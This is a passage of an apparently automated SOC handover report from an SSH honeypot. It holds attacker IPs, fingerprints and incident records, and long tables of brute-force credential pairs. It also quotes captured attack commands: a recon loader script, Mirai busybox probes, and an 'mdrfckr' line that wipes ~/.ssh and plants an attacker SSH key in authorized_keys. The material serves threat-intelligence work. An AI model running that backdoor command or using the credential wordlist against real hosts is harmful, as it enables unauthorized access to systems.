# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-09-11 |
| **Generated At** | 2026-09-11T08:47:33Z |
| **Shift Time** | 08:47 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **288** |
| Confirmed Threats | **269** |
| False Positives Filtered | **19** (6.6%) |
| Unique Attacker IPs | **64** |
| Countries of Origin | **28** |
| High Severity Cases | **84** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **204** |
| Malware Samples Analyzed | **4** HIGH · **21** MED · 18 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **197** |
| Unique Credential Pairs | **161** |
| Unique Usernames | **65** |
| Unique Passwords | **118** |
| Successful Auth Pairs | **180** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 65 |
| `admin` | 19 |
| `345gs5662d34` | 11 |
| `support` | 10 |
| `ubuntu` | 6 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `` | 13 |
| `345gs5662d34` | 11 |
| `3245gs5662d34` | 11 |
| `support` | 10 |
| `admin` | 8 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 11 |
| `support` | `support` | 10 |
| `admin` | `admin` | 5 |
| `root` | `admin` | 3 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | 3 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `ubuntu` | `12345` | `217.60.255.130` | 2026-09-11T03:07:04 |
| `root` | `000000` | `80.94.92.179` | 2026-09-11T03:16:52 |
| `root` | `111111` | `80.94.92.179` | 2026-09-11T03:19:09 |
| `root` | `123` | `80.94.92.179` | 2026-09-11T03:21:37 |
| `siesa` | `siesa` | `128.14.225.164` | 2026-09-11T03:22:52 |
| `345gs5662d34` | `345gs5662d34` | `128.14.225.164` | 2026-09-11T03:22:55 |
| `siesa` | `3245gs5662d34` | `128.14.225.164` | 2026-09-11T03:22:55 |
| `root` | `123123` | `80.94.92.179` | 2026-09-11T03:24:29 |
| `root` | `1234` | `80.94.92.179` | 2026-09-11T03:27:14 |
| `root` | `12345` | `80.94.92.179` | 2026-09-11T03:30:01 |
| `support` | `support` | `176.53.159.196` | 2026-09-11T03:34:02 |
| `root` | `12345678` | `80.94.92.179` | 2026-09-11T03:34:43 |
| `root` | `123456789` | `80.94.92.179` | 2026-09-11T03:37:28 |
| `xt` | `xt` | `10.0.0.73` | 2026-09-11T03:37:53 |
| `345gs5662d34` | `345gs5662d34` | `10.0.0.73` | 2026-09-11T03:37:57 |
| `xt` | `3245gs5662d34` | `10.0.0.73` | 2026-09-11T03:37:59 |
| `root` | `1q2w3e4r` | `80.94.92.179` | 2026-09-11T03:40:30 |
| `root` | `123@@@` | `165.1.75.106` | 2026-09-11T03:41:12 |
| `root` | `LeitboGi0ro` | `165.1.75.106` | 2026-09-11T03:41:14 |
| `root` | `654321` | `80.94.92.179` | 2026-09-11T03:42:58 |
| `root` | `12341234` | `185.134.231.98` | 2026-09-11T03:43:24 |
| `root` | `P@ssw0rd` | `80.94.92.179` | 2026-09-11T03:45:18 |
| `root` | `admin` | `80.94.92.179` | 2026-09-11T03:47:41 |
| `root` | `admin123` | `80.94.92.179` | 2026-09-11T03:50:02 |
| `hossein` | `123456` | `113.171.81.144` | 2026-09-11T03:51:48 |
| `345gs5662d34` | `345gs5662d34` | `113.171.81.144` | 2026-09-11T03:51:54 |
| `hossein` | `3245gs5662d34` | `113.171.81.144` | 2026-09-11T03:51:56 |
| `chris` | `chris12345` | `10.0.0.73` | 2026-09-11T03:53:29 |
| `chris` | `3245gs5662d34` | `10.0.0.73` | 2026-09-11T03:53:33 |
| `admin` | `admin` | `129.121.128.70` | 2026-09-11T03:56:26 |
| `admin` | `admin` | `130.12.180.51` | 2026-09-11T03:56:27 |
| `ubuntu` | `13579` | `217.60.255.130` | 2026-09-11T04:01:25 |
| `costel` | `costel` | `122.177.244.200` | 2026-09-11T04:38:46 |
| `345gs5662d34` | `345gs5662d34` | `122.177.244.200` | 2026-09-11T04:38:51 |
| `costel` | `3245gs5662d34` | `122.177.244.200` | 2026-09-11T04:38:53 |
| `root` | `dBU0f2nyno` | `84.161.241.179` | 2026-09-11T04:40:18 |
| `admin` | `admin` | `34.62.148.109` | 2026-09-11T04:40:27 |
| `root` | `sr1234` | `185.7.242.118` | 2026-09-11T04:42:21 |
| `345gs5662d34` | `345gs5662d34` | `185.7.242.118` | 2026-09-11T04:42:27 |
| `root` | `3245gs5662d34` | `185.7.242.118` | 2026-09-11T04:42:29 |
| `support` | `support` | `10.0.0.73` | 2026-09-11T04:44:39 |
| `admin` | `admin` | `47.80.68.74` | 2026-09-11T04:45:16 |
| `support` | `support` | `80.94.95.118` | 2026-09-11T05:01:34 |
| `support` | `support` | `77.90.185.17` | 2026-09-11T05:03:19 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `207.175.13.248` | 2026-09-11T05:07:49 |
| `*1` | `$4` | `207.175.13.248` | 2026-09-11T05:07:58 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 7296` | `207.175.13.248` | 2026-09-11T05:08:00 |
| `root` | `------fuck------` | `173.212.223.184` | 2026-09-11T05:13:46 |
| `pi` | `abcd1234` | `10.0.0.73` | 2026-09-11T05:30:47 |
| `root` | `ubuntu` | `123.131.17.131` | 2026-09-11T05:31:15 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `207.175.145.232` | 2026-09-11T05:45:07 |
| `*1` | `$4` | `207.175.145.232` | 2026-09-11T05:45:20 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 2085` | `207.175.145.232` | 2026-09-11T05:45:22 |
| `uucp` | `uucp` | `10.0.0.73` | 2026-09-11T05:45:24 |
| `test2` | `Password1` | `203.135.42.52` | 2026-09-11T05:45:57 |
| `345gs5662d34` | `345gs5662d34` | `203.135.42.52` | 2026-09-11T05:46:00 |
| `test2` | `3245gs5662d34` | `203.135.42.52` | 2026-09-11T05:46:02 |
| `uucp` | `uucp` | `138.226.239.233` | 2026-09-11T05:46:31 |
| `ubuntu` | `100000` | `217.60.255.130` | 2026-09-11T05:49:53 |
| `username` | `password` | `138.226.239.234` | 2026-09-11T05:51:44 |
| `solana` | `solana` | `45.148.10.183` | 2026-09-11T05:56:29 |
| `asus` | `123456` | `10.0.0.73` | 2026-09-11T05:57:35 |
| `solana` | `1234` | `45.148.10.183` | 2026-09-11T05:59:01 |
| `guest` | `1q2w3e4r` | `10.0.0.73` | 2026-09-11T06:00:07 |
| `guest` | `3245gs5662d34` | `10.0.0.73` | 2026-09-11T06:00:10 |
| `sol` | `1234` | `45.148.10.183` | 2026-09-11T06:01:36 |
| `gandalf` | `Huawei@CLOUD8` | `10.0.0.73` | 2026-09-11T06:03:33 |
| `gandalf` | `3245gs5662d34` | `10.0.0.73` | 2026-09-11T06:03:37 |
| `sol` | `123` | `45.148.10.183` | 2026-09-11T06:04:02 |
| `sol` | `Solana` | `45.148.10.183` | 2026-09-11T06:06:31 |
| `root` | `﻿------fuck------` | `36.41.186.9` | 2026-09-11T06:08:30 |
| `ollama` | `ollama` | `45.148.10.183` | 2026-09-11T06:08:57 |
| `llama.cpp` | `llama.cpp` | `45.148.10.183` | 2026-09-11T06:11:28 |
| `gpt4all` | `gpt4all` | `45.148.10.183` | 2026-09-11T06:13:57 |
| `root` | `admin` | `10.0.0.73` | 2026-09-11T06:15:02 |
| `1234` | `1234@123` | `10.0.0.73` | 2026-09-11T06:16:22 |
| `vllm` | `vllm` | `45.148.10.183` | 2026-09-11T06:16:29 |
| `jan` | `jan` | `45.148.10.183` | 2026-09-11T06:19:00 |
| `root` | `admin` | `138.226.239.233` | 2026-09-11T06:19:04 |
| `root` | `12345` | `10.0.0.73` | 2026-09-11T06:19:44 |
| `1234` | `1234123` | `10.0.0.73` | 2026-09-11T06:19:51 |
| `admin` | `12345` | `10.0.0.73` | 2026-09-11T06:20:21 |
| `ubuntu` | `ubuntu` | `45.148.10.183` | 2026-09-11T06:21:23 |
| `root` | `Welcome@123` | `10.0.0.73` | 2026-09-11T06:21:50 |
| `admin` | `Welcome@123` | `10.0.0.73` | 2026-09-11T06:22:24 |
| `1234` | `12341234` | `10.0.0.73` | 2026-09-11T06:23:16 |
| `anonymous` | `anonymous@123` | `10.0.0.73` | 2026-09-11T06:23:41 |
| `root` | `Indian@123` | `10.0.0.73` | 2026-09-11T06:23:51 |
| `ubuntu` | `ollama` | `45.148.10.183` | 2026-09-11T06:23:53 |
| `admin` | `Indian@123` | `10.0.0.73` | 2026-09-11T06:24:25 |
| `root` | `BGMI@123` | `10.0.0.73` | 2026-09-11T06:25:47 |
| `root` | `It123` | `10.0.0.73` | 2026-09-11T06:25:54 |
| `ubuntu` | `sglang` | `45.148.10.183` | 2026-09-11T06:26:17 |
| `1234` | `1234@1234` | `10.0.0.73` | 2026-09-11T06:26:25 |
| `admin` | `BGMI@123` | `10.0.0.73` | 2026-09-11T06:26:30 |
| `telnetuser` | `telnetuser@123` | `10.0.0.73` | 2026-09-11T06:27:08 |
| `root` | `1234` | `10.0.0.73` | 2026-09-11T06:27:36 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `34.22.200.106` | 2026-09-11T06:28:24 |
| `admin` | `1234` | `10.0.0.73` | 2026-09-11T06:28:28 |
| `*1` | `$4` | `34.22.200.106` | 2026-09-11T06:28:37 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 2911` | `34.22.200.106` | 2026-09-11T06:28:39 |
| `zxcv@1234` | `` | `10.0.0.73` | 2026-09-11T06:28:42 |
| `tensor` | `tensor` | `45.148.10.183` | 2026-09-11T06:28:48 |
| `nobody` | `nobody@123` | `10.0.0.73` | 2026-09-11T06:28:55 |
| `root` | `password@123` | `10.0.0.73` | 2026-09-11T06:29:22 |
| `1234` | `1234` | `10.0.0.73` | 2026-09-11T06:29:30 |
| `admin` | `admin@123` | `10.0.0.73` | 2026-09-11T06:30:35 |
| `root` | `Win2008` | `10.0.0.73` | 2026-09-11T06:31:02 |
| `hp` | `hp` | `45.148.10.183` | 2026-09-11T06:31:20 |
| `Afra@net` | `` | `10.0.0.73` | 2026-09-11T06:32:24 |
| `root` | `root@123` | `10.0.0.73` | 2026-09-11T06:32:27 |
| `root` | `1` | `10.0.0.73` | 2026-09-11T06:32:41 |
| `hp` | `hp123` | `45.148.10.183` | 2026-09-11T06:33:47 |
| `devops` | `devops@123` | `10.0.0.73` | 2026-09-11T06:33:54 |
| `afra@123` | `` | `10.0.0.73` | 2026-09-11T06:34:06 |
| `root` | `iran2023` | `10.0.0.73` | 2026-09-11T06:34:20 |
| `admin` | `1` | `10.0.0.73` | 2026-09-11T06:34:26 |
| `root` | `It123456` | `10.0.0.73` | 2026-09-11T06:34:54 |
| `root` | `root123` | `10.0.0.73` | 2026-09-11T06:35:29 |
| `dbadmin` | `dbadmin@123` | `10.0.0.73` | 2026-09-11T06:35:33 |
| `Unevercity` | `` | `10.0.0.73` | 2026-09-11T06:35:48 |
| `hp` | `hpc123` | `45.148.10.183` | 2026-09-11T06:36:22 |
| `admin` | `iran2023` | `10.0.0.73` | 2026-09-11T06:36:25 |
| `nginx` | `nginx@123` | `10.0.0.73` | 2026-09-11T06:37:11 |
| `unvercity` | `` | `10.0.0.73` | 2026-09-11T06:37:29 |
| `root` | `Ali123456789` | `10.0.0.73` | 2026-09-11T06:37:38 |
| `admin` | `Ali@123` | `10.0.0.73` | 2026-09-11T06:38:24 |
| `root` | `root1234` | `10.0.0.73` | 2026-09-11T06:38:34 |
| `hpc` | `hp@123` | `45.148.10.183` | 2026-09-11T06:38:45 |
| `http` | `http@123` | `10.0.0.73` | 2026-09-11T06:38:46 |
| `root` | `vps@1234` | `10.0.0.73` | 2026-09-11T06:39:14 |
| `root` | `It2023` | `10.0.0.73` | 2026-09-11T06:39:36 |
| `system` | `system@123` | `10.0.0.73` | 2026-09-11T06:40:22 |
| `root` | `Admin@123` | `10.0.0.73` | 2026-09-11T06:40:49 |
| `root` | `It2024` | `10.0.0.73` | 2026-09-11T06:41:14 |
| `root` | `root@1234` | `10.0.0.73` | 2026-09-11T06:41:33 |
| `service` | `service@123` | `10.0.0.73` | 2026-09-11T06:41:57 |
| `DataCenter` | `` | `10.0.0.73` | 2026-09-11T06:42:20 |
| `root` | `abc.123` | `10.0.0.73` | 2026-09-11T06:42:27 |
| `root` | `It2025` | `10.0.0.73` | 2026-09-11T06:42:54 |
| `ftp` | `ftp@123` | `10.0.0.73` | 2026-09-11T06:43:33 |
| `agave` | `agave` | `45.148.10.183` | 2026-09-11T06:43:42 |
| `root` | `A123456789.` | `10.0.0.73` | 2026-09-11T06:44:00 |
| `Data@Center` | `` | `10.0.0.73` | 2026-09-11T06:44:01 |
| `root` | `It@123` | `10.0.0.73` | 2026-09-11T06:44:30 |
| `vnc` | `vnc` | `10.0.0.73` | 2026-09-11T06:45:00 |
| `vnc` | `3245gs5662d34` | `10.0.0.73` | 2026-09-11T06:45:05 |
| `oracle` | `oracle@123` | `10.0.0.73` | 2026-09-11T06:45:06 |
| `root` | `Aa@1` | `10.0.0.73` | 2026-09-11T06:45:35 |
| `vps_!@#$%` | `` | `10.0.0.73` | 2026-09-11T06:45:38 |
| `root` | `It@1234` | `10.0.0.73` | 2026-09-11T06:46:09 |
| `jito-solana` | `jito-solana` | `45.148.10.183` | 2026-09-11T06:46:14 |
| `root` | `Root123..` | `10.0.0.73` | 2026-09-11T06:46:35 |
| `root` | `3245gs5662d34` | `10.0.0.73` | 2026-09-11T06:46:38 |
| `root` | `Aa@12` | `10.0.0.73` | 2026-09-11T06:47:11 |
| `arash123` | `` | `10.0.0.73` | 2026-09-11T06:47:18 |
| `root` | `It@12345` | `10.0.0.73` | 2026-09-11T06:47:49 |
| `admin` | `A123456789.` | `10.0.0.73` | 2026-09-11T06:48:11 |
| `smbuser` | `smbuser@123` | `10.0.0.73` | 2026-09-11T06:48:17 |
| `firedancer` | `firedancer` | `45.148.10.183` | 2026-09-11T06:48:45 |
| `root` | `Aa1234` | `10.0.0.73` | 2026-09-11T06:48:47 |
| `x@11` | `` | `10.0.0.73` | 2026-09-11T06:49:05 |
| `root` | `It@123456` | `10.0.0.73` | 2026-09-11T06:49:27 |
| `admin` | `Aa@1` | `10.0.0.73` | 2026-09-11T06:50:10 |
| `root` | `aA12345@` | `10.0.0.73` | 2026-09-11T06:50:24 |
| `admin` | `admin123` | `10.0.0.73` | 2026-09-11T06:50:25 |
| `Hello1234` | `` | `10.0.0.73` | 2026-09-11T06:50:41 |
| `root` | `It@2022` | `10.0.0.73` | 2026-09-11T06:51:04 |
| `frankendancer` | `frankendancer` | `45.148.10.183` | 2026-09-11T06:51:13 |
| `apache` | `apache@123` | `10.0.0.73` | 2026-09-11T06:51:28 |
| `root` | `Web@123` | `10.0.0.73` | 2026-09-11T06:51:56 |
| `qwe123456!` | `` | `10.0.0.73` | 2026-09-11T06:52:21 |
| `root` | `It@2023` | `10.0.0.73` | 2026-09-11T06:52:57 |
| `postgres` | `postgres@123` | `10.0.0.73` | 2026-09-11T06:53:02 |
| `admin` | `admin1234` | `10.0.0.73` | 2026-09-11T06:53:18 |
| `root` | `Web123` | `10.0.0.73` | 2026-09-11T06:53:32 |
| `paladin` | `paladin` | `45.148.10.183` | 2026-09-11T06:53:47 |
| `123ZXC_` | `` | `10.0.0.73` | 2026-09-11T06:54:00 |
| `developer` | `developer@123` | `10.0.0.73` | 2026-09-11T06:54:35 |
| `root` | `It@2024` | `10.0.0.73` | 2026-09-11T06:55:01 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **288** |
| Sessions with Fingerprint | **21** |
| Unique HASSH Fingerprints | **21** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 48 |
| libssh | 22 |
| OpenSSH | 10 |
| Unknown | 6 |
| Paramiko (Python) | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `16443846184e...` | Generic scanner | 25 | 2 |
| `2ec37a7cc8da...` | Mirai/variant | 14 | 1 |
| `f555226df196...` | Mirai/variant | 13 | 5 |
| `a984ff804585...` | libssh-based | 5 | 1 |
| `390ffe68a68c...` | Modern SSH client | 5 | 4 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `16443846184e...` | Go SSH scanner | 25 | 2 | Generic scanner |
| `2ec37a7cc8da...` | Go SSH scanner | 14 | 1 | Mirai/variant |
| `f555226df196...` | libssh | 13 | 5 | Mirai/variant |
| `a984ff804585...` | OpenSSH | 5 | 1 | libssh-based |
| `390ffe68a68c...` | OpenSSH | 5 | 4 | Modern SSH client |
| `419da4c91ddb...` | libssh | 4 | 1 | Modern SSH client |
| `eff4c24daffc...` | Go SSH scanner | 4 | 1 | Modern SSH client |
| `03a80b21afa8...` | libssh | 3 | 1 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **8** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 13 | 1 | `T1082, T1592, T1078, T1083` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1140, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 5 | 5 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `80.94.92.179`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
enable
```
```
system
```
```
shell
```
```
sh
```
```
/bin/busybox TOKEN
```
Source IPs: `185.134.231.98`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `113.171.81.144`, `122.177.244.200`, `203.135.42.52`, `185.7.242.118`, `128.14.225.164`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **64** |
| Unique ASNs | **30** |
| High-Risk ASNs | **20** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 22 | HIGH |
| `AS396982` | Google LLC | 6 | HIGH |
| `AS213412` | ONYPHE SAS | 3 | LOW |
| `AS10617` | SION S.A | 3 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 2 | HIGH |
| `AS9121` | Turk Telekomunikasyon Anonim Sirketi | 2 | MEDIUM |
| `AS6939` | Hurricane Electric LLC | 2 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (84)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-67fce760a3bb

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-11 03:07 |
| **Last Seen** | 2026-09-11 03:07 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-11 03:07:00` | `cowrie.session.connect` |
| `2026-09-11 03:07:01` | `cowrie.client.version` |
| `2026-09-11 03:07:01` | `cowrie.client.kex` |
| `2026-09-11 03:07:04` | `cowrie.login.success` |
| `2026-09-11 03:07:04` | `cowrie.direct-tcpip.request` |
| `2026-09-11 03:07:05` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-11 03:07:05` | `cowrie.direct-tcpip.data` |
| `2026-09-11 03:07:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d789e5ba3cc6

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-09-11 03:16 |
| **Last Seen** | 2026-09-11 03:16 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-11 03:16:49` | `cowrie.session.connect` |
| `2026-09-11 03:16:50` | `cowrie.client.version` |
| `2026-09-11 03:16:50` | `cowrie.client.kex` |
| `2026-09-11 03:16:52` | `cowrie.login.success` |
| `2026-09-11 03:16:53` | `cowrie.session.params` |
| `2026-09-11 03:16:53` | `cowrie.command.input` |
| `2026-09-11 03:16:53` | `cowrie.command.input` |
| `2026-09-11 03:16:53` | `cowrie.command.input` |
| `2026-09-11 03:16:53` | `cowrie.command.input` |
| `2026-09-11 03:16:53` | `cowrie.command.input` |
| `2026-09-11 03:16:53` | `cowrie.command.success` |
| `2026-09-11 03:16:53` | `cowrie.command.input` |
| `2026-09-11 03:16:53` | `cowrie.command.input` |
| `2026-09-11 03:16:53` | `cowrie.command.input` |
| `2026-09-11 03:16:53` | `cowrie.command.input` |
| `2026-09-11 03:16:54` | `cowrie.log.closed` |
| `2026-09-11 03:16:55` | `cowrie.session.params` |
| `2026-09-11 03:16:55` | `cowrie.command.input` |
| `2026-09-11 03:16:55` | `cowrie.log.closed` |
| `2026-09-11 03:16:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-137435fe6fed

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-09-11 03:19 |
| **Last Seen** | 2026-09-11 03:19 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-11 03:19:07` | `cowrie.session.connect` |
| `2026-09-11 03:19:07` | `cowrie.client.version` |
| `2026-09-11 03:19:07` | `cowrie.client.kex` |
| `2026-09-11 03:19:09` | `cowrie.login.success` |
| `2026-09-11 03:19:10` | `cowrie.session.params` |
| `2026-09-11 03:19:10` | `cowrie.command.input` |
| `2026-09-11 03:19:10` | `cowrie.command.input` |
| `2026-09-11 03:19:10` | `cowrie.command.input` |
| `2026-09-11 03:19:10` | `cowrie.command.input` |
| `2026-09-11 03:19:10` | `cowrie.command.input` |
| `2026-09-11 03:19:10` | `cowrie.command.success` |
| `2026-09-11 03:19:10` | `cowrie.command.input` |
| `2026-09-11 03:19:10` | `cowrie.command.input` |
| `2026-09-11 03:19:10` | `cowrie.command.input` |
| `2026-09-11 03:19:10` | `cowrie.command.input` |
| `2026-09-11 03:19:11` | `cowrie.log.closed` |
| `2026-09-11 03:19:12` | `cowrie.session.params` |
| `2026-09-11 03:19:12` | `cowrie.command.input` |
| `2026-09-11 03:19:12` | `cowrie.log.closed` |
| `2026-09-11 03:19:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd42ba4d2bd0

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-09-11 03:21 |
| **Last Seen** | 2026-09-11 03:21 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-11 03:21:37` | `cowrie.session.connect` |
| `2026-09-11 03:21:37` | `cowrie.client.version` |
| `2026-09-11 03:21:37` | `cowrie.client.kex` |
| `2026-09-11 03:21:37` | `cowrie.login.success` |
| `2026-09-11 03:21:38` | `cowrie.session.params` |
| `2026-09-11 03:21:38` | `cowrie.command.input` |
| `2026-09-11 03:21:38` | `cowrie.command.input` |
| `2026-09-11 03:21:38` | `cowrie.command.input` |
| `2026-09-11 03:21:38` | `cowrie.command.input` |
| `2026-09-11 03:21:38` | `cowrie.command.input` |
| `2026-09-11 03:21:38` | `cowrie.command.success` |
| `2026-09-11 03:21:38` | `cowrie.command.input` |
